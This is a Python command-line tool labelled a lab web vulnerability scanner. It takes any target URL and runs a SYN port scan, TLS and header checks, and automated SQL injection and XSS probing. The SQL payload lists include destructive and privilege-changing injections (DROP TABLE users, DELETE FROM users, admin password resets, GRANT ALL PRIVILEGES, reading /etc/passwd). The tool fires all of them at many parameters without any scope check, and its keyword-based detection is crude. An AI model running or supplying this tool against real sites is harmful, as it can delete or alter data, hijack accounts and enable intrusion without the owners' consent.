#!/usr/bin/env python3
"""
Automated Web Vulnerability Scanner for Lab Environment
Features: No cache bypass, no WAF bypass, origin IP detection, TLS fingerprinting
Updated: Replaced directory enumeration with comprehensive SQL scanning
"""

import requests
import socket
import ssl
import json
import time
import threading
from urllib.parse import urljoin, urlparse, urlencode
import subprocess
import argparse
import nmap
import dns.resolver
import sys
import os

class LabVulnerabilityScanner:
    def __init__(self, target_url, threads=5):
        self.target_url = target_url
        self.threads = threads
        self.session = requests.Session()
        self.results = {}
        
        # Disable caching and headers that might trigger protections
        self.session.headers.update({
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'User-Agent': 'Lab-Scanner/1.0'
        })
    
    def detect_origin_ip(self):
        """Detect origin IP without DNS proxy"""
        try:
            domain = urlparse(self.target_url).netloc
            # Direct IP resolution
            ip = socket.gethostbyname(domain)
            self.results['origin_ip'] = ip
            print(f"[+] Origin IP detected: {ip}")
            return ip
        except Exception as e:
            print(f"[-] Origin IP detection failed: {e}")
            return None
    
    def tls_fingerprinting(self):
        """Perform TLS fingerprinting on target"""
        try:
            hostname = urlparse(self.target_url).netloc
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    cert = ssock.getpeercert()
                    
                    tls_info = {
                        'cipher_suite': cipher[0],
                        'protocol_version': ssock.version(),
                        'certificate_issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'certificate_subject': dict(x[0] for x in cert.get('subject', []))
                    }
                    
                    self.results['tls_fingerprint'] = tls_info
                    print(f"[+] TLS Fingerprint: {tls_info}")
                    
        except Exception as e:
            print(f"[-] TLS fingerprinting failed: {e}")
    
    def port_scanning(self, ip):
        """Basic port scanning for common web ports"""
        try:
            nm = nmap.PortScanner()
            ports = "80,443,8080,8443,3000,5000,8000,9000"
            
            print(f"[*] Scanning ports on {ip}...")
            nm.scan(ip, ports, arguments='-sS -T4')
            
            open_ports = {}
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]['state']
                        if state == 'open':
                            open_ports[port] = nm[host][proto][port]
            
            self.results['open_ports'] = open_ports
            print(f"[+] Open ports: {open_ports}")
            
        except Exception as e:
            print(f"[-] Port scanning failed: {e}")
    
    def comprehensive_sql_scanning(self):
        """Comprehensive SQL injection scanning with DDL, DML, DQL, TCL, DCL techniques"""
        print("[*] Starting Comprehensive SQL Scanning...")
        
        # Organized SQL injection payloads by category
        sql_payloads = {
            # DQL - Data Query Language (SELECT operations)
            'dql': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT database(),user(),version()--",
                "' UNION SELECT null,table_name,null FROM information_schema.tables--",
                "' UNION SELECT null,column_name,null FROM information_schema.columns--",
                "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
                "' UNION SELECT 1,@@version,3--",
                "' UNION SELECT 1,load_file('/etc/passwd'),3--",
                "' UNION SELECT 1,hex(load_file('/etc/passwd')),3--"
            ],
            
            # DML - Data Manipulation Language (INSERT, UPDATE, DELETE)
            'dml': [
                "'; INSERT INTO users (username,password) VALUES ('hacker','pwned')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; DELETE FROM users WHERE username='admin'--",
                "' OR 1=1; INSERT INTO logs (action) VALUES ('sqli_success')--",
                "admin'; UPDATE admin SET password=MD5('hacked')--"
            ],
            
            # DDL - Data Definition Language (CREATE, ALTER, DROP)
            'ddl': [
                "'; CREATE TABLE pwned (data varchar(255))--",
                "'; ALTER TABLE users ADD COLUMN pwned varchar(255)--",
                "'; DROP TABLE users--",
                "'; TRUNCATE TABLE logs--"
            ],
            
            # TCL - Transaction Control Language
            'tcl': [
                "'; COMMIT--",
                "'; ROLLBACK--",
                "'; START TRANSACTION; DROP TABLE users; COMMIT--"
            ],
            
            # DCL - Data Control Language (GRANT, REVOKE)
            'dcl': [
                "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--",
                "'; REVOKE ALL PRIVILEGES FROM 'admin'@'localhost'--",
                "' UNION SELECT 1,grantee,privilege_type FROM information_schema.user_privileges--"
            ],
            
            # Boolean-based Blind SQLi
            'boolean': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING((SELECT database()),1,1)='a'--",
                "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114--",  # 'r' for root
                "' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--"
            ],
            
            # Time-based Blind SQLi
            'time_based': [
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND pg_sleep(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--"
            ],
            
            # Error-based SQLi
            'error_based': [
                "' AND ExtractValue(1,CONCAT(0x3a,(SELECT user())))--",
                "' AND UpdateXML(1,CONCAT(0x3a,(SELECT database())),1)--"
            ],
            
            # Stacked Queries
            'stacked': [
                "'; SELECT * FROM users--",
                "'; SHOW TABLES--",
                "'; DESCRIBE users--"
            ]
        }
        
        # Common vulnerable parameters
        test_params = [
            'id', 'user', 'username', 'password', 'email', 'page', 
            'category', 'search', 'q', 'product', 'order', 'sort', 
            'filter', 'limit', 'offset', 'name', 'title'
        ]
        
        vulnerable_findings = []
        total_tested = 0
        
        print(f"[*] Testing {len(test_params)} parameters with {sum(len(payloads) for payloads in sql_payloads.values())} payloads")
        
        for category, payloads in sql_payloads.items():
            print(f"\n[*] Testing {category.upper()} payloads...")
            
            for param in test_params:
                for payload in payloads:
                    total_tested += 1
                    
                    # Test GET parameters
                    test_url = f"{self.target_url}?{param}={payload}"
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=15)
                        response_time = time.time() - start_time
                        
                        # Enhanced detection logic
                        vulnerability_detected = False
                        detection_reason = ""
                        
                        # Error-based detection
                        error_keywords = ['sql', 'mysql', 'oracle', 'postgres', 'syntax', 
                                    'error', 'warning', 'exception', 'undefined',
                                    'mysql_fetch', 'pg_', 'mssql_', 'odbc_']
                        
                        # Content-based detection
                        success_keywords = ['root', 'admin', 'welcome', 'success', 
                                        'database', 'table', 'column', 'select']
                        
                        # Check for error messages
                        if any(keyword in response.text.lower() for keyword in error_keywords):
                            vulnerability_detected = True
                            detection_reason = f"Error message detected - {category}"
                        
                        # Time-based detection
                        elif any(time_keyword in payload.upper() for time_keyword in ['SLEEP', 'DELAY', 'BENCHMARK']):
                            if response_time > 5:
                                vulnerability_detected = True
                                detection_reason = f"Time delay detected ({response_time:.2f}s) - {category}"
                        
                        # Boolean-based detection
                        elif "' AND 1=1--" in payload or "' AND 1=2--" in payload:
                            # Test with false condition
                            false_payload = payload.replace("1=1", "1=2").replace("'a'='a", "'a'='b")
                            false_url = f"{self.target_url}?{param}={false_payload}"
                            try:
                                false_response = self.session.get(false_url, timeout=10)
                                if response.text != false_response.text:
                                    vulnerability_detected = True
                                    detection_reason = f"Boolean-based content difference - {category}"
                            except:
                                pass
                        
                        # Union-based detection
                        elif "UNION" in payload.upper() and response.status_code == 200:
                            if any(success_indicator in response.text.lower() for success_indicator in success_keywords):
                                vulnerability_detected = True
                                detection_reason = f"Union-based data retrieval - {category}"
                        
                        if vulnerability_detected:
                            vulnerable_findings.append({
                                'category': category.upper(),
                                'parameter': param,
                                'payload': payload,
                                'type': f"SQL Injection - {category.upper()}",
                                'url': test_url,
                                'response_time': response_time,
                                'status_code': response.status_code,
                                'detection_reason': detection_reason
                            })
                            print(f"[!] {category.upper()} SQL Injection found!")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload}")
                            print(f"    Reason: {detection_reason}")
                            print("-" * 60)
                            
                    except requests.exceptions.Timeout:
                        if any(time_keyword in payload.upper() for time_keyword in ['SLEEP', 'DELAY', 'BENCHMARK']):
                            vulnerable_findings.append({
                                'category': category.upper(),
                                'parameter': param,
                                'payload': payload,
                                'type': f"Time-based SQL Injection (Timeout)",
                                'url': test_url,
                                'response_time': "Timeout",
                                'status_code': "N/A",
                                'detection_reason': f"Request timeout - {category}"
                            })
                            print(f"[!] Time-based SQL Injection (Timeout) found!")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload}")
                            print("-" * 60)
                    except Exception as e:
                        pass
        
        # POST-based SQL injection testing
        print("\n[*] Testing POST-based SQL Injection...")
        
        post_payloads = [
            {"username": "admin' OR '1'='1", "password": "test"},
            {"email": "test@test.com' OR '1'='1", "password": "test"},
            {"search": "' UNION SELECT 1,2,3--", "submit": "1"}
        ]
        
        for post_data in post_payloads:
            try:
                response = self.session.post(self.target_url, data=post_data, timeout=10)
                
                # Check for authentication bypass
                if response.status_code in [200, 302, 301]:
                    bypass_indicators = ['logout', 'welcome', 'dashboard', 'admin panel']
                    if any(indicator in response.text.lower() for indicator in bypass_indicators):
                        vulnerable_findings.append({
                            'category': 'POST_DML',
                            'parameter': 'POST Data',
                            'payload': str(post_data),
                            'type': "Authentication Bypass SQL Injection",
                            'url': self.target_url,
                            'method': 'POST',
                            'status_code': response.status_code,
                            'detection_reason': "Potential authentication bypass via POST"
                        })
                        print(f"[!] POST-based Authentication Bypass found!")
                        print(f"    Payload: {post_data}")
                        print("-" * 60)
            except Exception as e:
                pass
        
        # Results analysis
        print(f"\n[+] Comprehensive SQL Scanning Completed!")
        print(f"    Total tests performed: {total_tested}")
        print(f"    Total vulnerabilities found: {len(vulnerable_findings)}")
        
        # Categorize findings
        findings_by_category = {}
        for finding in vulnerable_findings:
            category = finding['category']
            if category not in findings_by_category:
                findings_by_category[category] = []
            findings_by_category[category].append(finding)
        
        print(f"\n[+] Findings by Category:")
        for category, findings in findings_by_category.items():
            print(f"    {category}: {len(findings)} vulnerabilities")
        
        self.results['comprehensive_sql_scan'] = {
            'total_tests': total_tested,
            'vulnerabilities_found': len(vulnerable_findings),
            'findings': vulnerable_findings,
            'summary_by_category': findings_by_category
        }
        
        return vulnerable_findings
    
    def header_analysis(self):
        """Analyze HTTP headers for security misconfigurations"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = dict(response.headers)
            
            security_headers = {
                'X-Frame-Options': headers.get('X-Frame-Options', 'MISSING'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'MISSING'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'MISSING'),
                'Content-Security-Policy': headers.get('Content-Security-Policy', 'MISSING')
            }
            
            self.results['security_headers'] = security_headers
            print(f"[+] Security Headers Analysis: {security_headers}")
            
        except Exception as e:
            print(f"[-] Header analysis failed: {e}")
    
    def advanced_sql_injection_test(self):
        """Advanced SQL injection testing - now calls comprehensive scanning"""
        return self.comprehensive_sql_scanning()
    
    def xss_test(self):
        """Basic XSS testing"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>"
        ]
        
        print("[*] Testing for XSS vulnerabilities...")
        xss_findings = []
        
        test_params = ['q', 'search', 'name', 'message']
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if payload is reflected without encoding
                    if payload in response.text:
                        xss_findings.append({
                            'parameter': param,
                            'payload': payload,
                            'url': test_url
                        })
                        print(f"[!] Potential XSS found: {param}")
                        
                except:
                    pass
        
        self.results['xss'] = xss_findings

    def infrastructure_discovery(self):
        """Infrastructure discovery only"""
        print(f"[*] Starting infrastructure discovery for {self.target_url}")
        
        origin_ip = self.detect_origin_ip()
        if origin_ip:
            self.port_scanning(origin_ip)
        
        self.tls_fingerprinting()
        self.header_analysis()
        
        print("[+] Infrastructure discovery completed!")
    
    def application_scan(self):
        """Application level scanning only"""
        print(f"[*] Starting application scanning for {self.target_url}")
        
        self.comprehensive_sql_scanning()  # Using the new comprehensive method
        self.xss_test()
        
        print("[+] Application scanning completed!")
    
    def comprehensive_scan(self):
        """Run comprehensive vulnerability scan"""
        print(f"[*] Starting comprehensive scan of {self.target_url}")
        
        # Phase 1: Infrastructure Discovery
        self.infrastructure_discovery()
        
        # Phase 2: Application Testing
        self.application_scan()
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive scan report"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        report = {
            'scan_info': {
                'target': self.target_url,
                'timestamp': timestamp,
                'scanner': 'Lab Vulnerability Scanner'
            },
            'findings': self.results
        }
        
        filename = f"scan_report_{timestamp.replace(' ', '_').replace(':', '-')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Scan completed! Report saved as: {filename}")
        
        # Print summary
        self.print_summary()

    def print_summary(self):
        """Print scan summary"""
        print("\n" + "="*60)
        print("COMPREHENSIVE SQL SCAN SUMMARY")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Origin IP: {self.results.get('origin_ip', 'Not found')}")
        print(f"Open ports: {len(self.results.get('open_ports', {}))}")
        
        sql_scan_results = self.results.get('comprehensive_sql_scan', {})
        total_sql_tests = sql_scan_results.get('total_tests', 0)
        sql_vulnerabilities = sql_scan_results.get('vulnerabilities_found', 0)
        
        print(f"SQL Injection Tests: {total_sql_tests}")
        print(f"SQL Vulnerabilities Found: {sql_vulnerabilities}")
        
        if sql_vulnerabilities > 0:
            print(f"\n[!] SQL INJECTION VULNERABILITIES DETECTED!")
            
            # Show breakdown by SQL category
            summary_by_category = sql_scan_results.get('summary_by_category', {})
            for category, findings in summary_by_category.items():
                print(f"    {category}: {len(findings)} findings")
            
            print(f"\n[+] Most Critical Findings:")
            findings = sql_scan_results.get('findings', [])
            for i, finding in enumerate(findings[:5], 1):  # Show first 5
                print(f"  {i}. {finding['category']} - {finding['parameter']}")
                print(f"     Payload: {finding['payload'][:50]}...")
        
        print(f"XSS findings: {len(self.results.get('xss', []))}")
        print("="*60)

def display_banner():
    """Display tool banner"""
    banner = """
    ╔═══════════════════════════════════════════════╗
    ║           Lab Vulnerability Scanner           ║
    ║        Advanced SQL Injection Testing         ║
    ╚═══════════════════════════════════════════════╝
    """
    print(banner)

def display_menu():
    """Display main menu options"""
    menu = """
    [1] Auto Comprehensive Scan
    [2] Advanced SQL Injection Test
    [3] Comprehensive SQL Scanning (NEW)
    [4] XSS Test
    [5] Header Analysis
    [6] TLS Fingerprinting
    [7] Port Scanning
    [8] Infrastructure Discovery
    [9] Custom Scan
    [0] Exit
    
    """
    print(menu)

def get_target_url():
    """Get target URL from user input"""
    while True:
        target = input("Enter target URL (e.g., https://example.com): ").strip()
        if target.startswith(('http://', 'https://')):
            return target
        else:
            print("[-] Please enter a valid URL with http:// or https://")

def main():
    display_banner()
    
    parser = argparse.ArgumentParser(description='Lab Web Vulnerability Scanner')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads')
    
    args = parser.parse_args()
    
    # Get target URL
    if args.url:
        target_url = args.url
    else:
        target_url = get_target_url()
    
    # Initialize scanner
    scanner = LabVulnerabilityScanner(target_url, args.threads)
    
    while True:
        display_menu()
        choice = input("Select an option [0-9]: ").strip()
        
        if choice == '1':
            print("\n[+] Starting Auto Comprehensive Scan...")
            scanner.comprehensive_scan()
            
        elif choice == '2':
            print("\n[+] Starting Advanced SQL Injection Test...")
            scanner.advanced_sql_injection_test()
            scanner.print_summary()
            
        elif choice == '3':
            print("\n[+] Starting Comprehensive SQL Scanning...")
            scanner.comprehensive_sql_scanning()
            scanner.print_summary()
            
        elif choice == '4':
            print("\n[+] Starting XSS Test...")
            scanner.xss_test()
            scanner.print_summary()
            
        elif choice == '5':
            print("\n[+] Starting Header Analysis...")
            scanner.header_analysis()
            
        elif choice == '6':
            print("\n[+] Starting TLS Fingerprinting...")
            scanner.tls_fingerprinting()
            
        elif choice == '7':
            print("\n[+] Starting Port Scanning...")
            ip = scanner.detect_origin_ip()
            if ip:
                scanner.port_scanning(ip)
            
        elif choice == '8':
            print("\n[+] Starting Infrastructure Discovery...")
            scanner.infrastructure_discovery()
            scanner.print_summary()
            
        elif choice == '9':
            print("\n[+] Custom Scan Options")
            print("Select scans to run (comma-separated):")
            print("1. Infrastructure Discovery")
            print("2. Comprehensive SQL Scanning") 
            print("3. XSS Test")
            print("4. Header Analysis")
            
            custom_choice = input("Enter choices (e.g., 1,2,3): ").strip()
            selections = custom_choice.split(',')
            
            for select in selections:
                if select == '1':
                    scanner.infrastructure_discovery()
                elif select == '2':
                    scanner.comprehensive_sql_scanning()
                elif select == '3':
                    scanner.xss_test()
                elif select == '4':
                    scanner.header_analysis()
            
            scanner.generate_report()
            
        elif choice == '0':
            print("\n[+] Thank you for using Lab Vulnerability Scanner!")
            break
            
        else:
            print("[-] Invalid option! Please try again.")
        
        # Ask if user wants to continue
        if choice != '0':
            cont = input("\nContinue scanning? (y/n): ").strip().lower()
            if cont != 'y':
                print("\n[+] Thank you for using Lab Vulnerability Scanner!")
                break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Scan interrupted by user!")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n[-] An error occurred: {e}")
        sys.exit(1)
